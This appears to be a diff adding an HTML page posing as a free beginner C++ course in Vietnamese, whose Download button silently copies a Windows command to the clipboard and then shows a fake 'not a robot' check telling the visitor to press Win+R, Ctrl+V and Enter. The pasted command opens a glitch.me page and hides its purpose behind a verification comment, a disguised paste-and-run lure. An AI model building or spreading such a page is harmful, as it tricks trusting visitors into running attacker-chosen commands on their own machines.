@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Khóa học dành cho newbie C++</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+</head>
+
+<style>
+    body{
+        top: 0;
+        left:0;
+        margin: 0;
+        padding: 0;
+    }
+    .header{
+        background-color: rgb(192, 207, 230);
+        display: flex;      
+        align-items: center;
+        height: 100px;
+        margin: 30px 0;
+    }
+    .header h2{
+        margin: 15px;
+        font-family: Arial, Helvetica, sans-serif;
+        color: black;
+        font-size: 48px;
+    }
+    .header br {
+        font-size: 20px;
+        margin: 20px;
+        font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+    }
+    .lesson1{
+        display: flex;
+        flex-direction: column;
+        margin: 20px;
+        width: 300px;
+        height: 440px;
+        position: relative;
+        border-radius: 25px;
+        border: 1px solid rgb(187, 187, 187);
+    }
+    .lesson1:hover{
+        border: 1.5px solid rgb(119, 183, 215);
+        /* transition: border 0.3s; */
+    }
+    img{
+        width: 280px;
+        height: 220px;
+        border-radius: 15px;
+        margin: 10px;
+    }
+    .lesson1 h3{
+        margin: 10px;
+        font-size: 21px;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+    
+    .info{
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+    }
+    .infoo{
+        display: flex;
+        width: 100%;
+    }
+    .info span{
+        margin: 10px;
+        font-size: 14px;
+        color: rgb(107, 107, 107);
+    }
+    button{
+        font-size: 20px;
+        border: none;
+        background-color: white;
+        border-radius: 10px;
+        width: 140px;
+        height: 40px;
+        margin: 20px;
+    }
+    button:hover{
+        background-color: rgb(200, 198, 198);
+        box-shadow: 0 1px 3px rgb(164, 164, 164);
+    }
+    a{
+        text-decoration: none;
+        font-size: 24px;
+        display: block;
+        color: black ;
+        background-color: none;
+    }
+</style>
+<body>
+    <header class="header">
+        <div><h2>C++</h2></div>
+    
+        <p>
+            <br> Khóa học C++ miễn phí cho người mới bắt đầu!</br>
+        </p>
+    </header>
+    <container>
+        <div class="lesson1">
+            <img src="https://i.ytimg.com/vi/hu20Ld4Yf-A/maxresdefault.jpg">
+            <div class="info">
+            <h3 class="text-lesson">Khóa học C++: Năm Vững Lập Trình, Xây Dựng Hiệu Quả...</h3>
+            <div class="infoo"><span>Buihoang-K58Neu</span></div>
+            <button onclick="myFunction(this)" data-text="cmd /k color C7 && echo Get info from your PC... && start chrome https://2d44-4e7e-8a24-e232.glitch.me/ && echo Compeleted && :: /verifying you aren't robot, enter to download file"><i class="fa-solid fa-download"></i> Download</button>
+            </div>
+        </div>
+    </container>
+    <script>
+        function myFunction(element) {
+        let cltocop = element.getAttribute("data-text");
+        navigator.clipboard.writeText(cltocop)
+        .then(() => {
+          alert("Verifying that you are not a robot: \n - Windown + R \n - Ctrl + v \n - Enter");
+        })
+    }
+        </script>
+    <style>
+        footer{
+            margin-top: 150px;
+            background-color: black;
+            color:aliceblue;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+
+        }
+        footer .intro{
+            margin: 30px;
+            width: 100%;
+        }
+        footer .intro p{
+            font-size: 18px;
+
+        }
+    </style>
+    <footer>
+        <div class="intro">
+            <h3>● Introduce</h3>
+            <p>About us</p>
+            <p>Contact</p>    
+            <p>Article</p>    
+            <p>Terms of Service</p>   
+            <p>Information security policy</p>
+            <h3>| General policy & support |</h3>
+            
+        </div>
+        <span>Copyright © Medoo | All rights reserved</span>
+    </footer>
+</body>
+</html>
